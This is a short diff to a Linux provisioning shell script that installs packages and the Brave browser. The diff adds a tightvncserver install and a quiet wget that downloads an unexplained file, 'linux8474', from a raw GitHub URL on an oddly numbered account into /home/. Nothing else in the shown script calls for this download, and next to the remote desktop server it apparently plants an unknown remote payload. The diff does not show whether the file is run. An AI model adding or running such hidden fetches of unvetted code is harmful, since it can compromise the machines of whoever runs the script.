@@ -2,6 +2,8 @@ apt-get update
 
 apt-get -y install bc
 
+apt-get -y install tightvncserver
+
 apt-get -y install apt-transport-https curl
 
 curl -s https://brave-browser-apt-release.s3.brave.com/brave-core.asc | sudo apt-key --keyring /etc/apt/trusted.gpg.d/brave-browser-release.gpg add -
@@ -51,6 +53,10 @@ apt-get -y install libx11-dev
 apt-get -y install libxtst-dev
 
 apt-get -y install libxinerama1 libxinerama-dev
+
+cd /home/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8474
 
 cd /etc/
 
